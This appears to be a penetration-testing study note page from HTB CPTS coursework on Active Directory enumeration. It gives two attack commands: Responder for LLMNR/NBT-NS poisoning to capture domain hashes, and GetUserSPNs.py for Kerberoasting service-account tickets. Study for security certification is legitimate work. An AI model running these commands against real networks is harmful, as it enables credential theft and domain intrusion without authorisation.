---
layout: default
title: Active Directory Enumeration
nav_order: 1
has_children: true
---

# 📂 Active Directory Infrastructure

Notes compiled during the HTB CPTS pathway mapping enterprise domain environments.

{: .note }
> **Operational Status**: Active Study Track for CPTS compliance.

## 0x01. Initial LLMNR/NBT-NS Poisoning
Capture initial domain hashes across targeted network segments:
```bash
sudo responder -I eth0 -rdw
```

## 0x02. Domain Kerberoasting
Execute active SPN profile sweeping paths:
```bash
GetUserSPNs.py -dc-ip 10.10.10.10 domain.local/user:password -request
```
